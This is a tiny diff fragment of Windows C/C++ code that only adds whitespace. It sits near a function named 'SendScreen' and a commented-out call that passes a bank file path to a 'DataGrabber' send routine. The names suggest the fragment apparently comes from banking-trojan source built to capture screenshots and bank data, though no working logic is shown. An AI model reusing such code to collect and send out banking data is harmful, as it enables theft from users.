@@ -1225,7 +1225,8 @@ bool SendScreen( LPVOID lpFile, DWORD dwFileSize )
 //	DataGrabber::SendCab(Bank->FilePath, "BSS", NULL);
 //
 //	return 0;
-//}
+//}
+
 
 /* DWORD WINAPI SendBSSInist( LPVOID lpData )
 {
